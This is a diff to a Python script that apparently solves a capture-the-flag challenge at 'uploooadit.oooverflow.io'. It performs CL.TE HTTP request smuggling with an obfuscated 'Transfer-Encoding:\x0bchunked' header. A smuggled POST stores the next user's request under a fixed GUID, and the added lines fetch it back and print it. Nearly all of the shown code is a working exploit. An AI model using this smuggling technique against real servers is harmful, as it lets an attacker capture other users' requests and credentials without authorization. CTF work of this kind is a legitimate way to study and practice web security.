@@ -3,6 +3,8 @@ import socket
 import ssl
 import sys
 
+import requests
+
 
 CLTE_TEMPLATE = """GET / HTTP/1.1
 Host: localhost
@@ -14,6 +16,7 @@ Transfer-Encoding:\x0bchunked
 
 """
 
+GUID = "aa7e4586-d547-4a4a-a088-fc208a437a6f"
 HOSTNAME = "uploooadit.oooverflow.io"
 
 
@@ -45,16 +48,19 @@ def clte(payload):
 
 
 def main():
-    payload = """POST /files/ HTTP/1.1
+    payload = f"""POST /files/ HTTP/1.1
 Connection: close
-Content-Length: 358
+Content-Length: 385
 Content-Type: text/plain
 User-Agent: hacked
-X-guid: aa7e4586-d547-4a4a-a088-fc208a437a6c
+X-guid: {GUID}
 
 """
 
     request(clte(payload))
+
+    response = requests.get(f"https://{HOSTNAME}/files/{GUID}")
+    print(response.content.decode("utf-8"))
 
 
 if __name__ == "__main__":
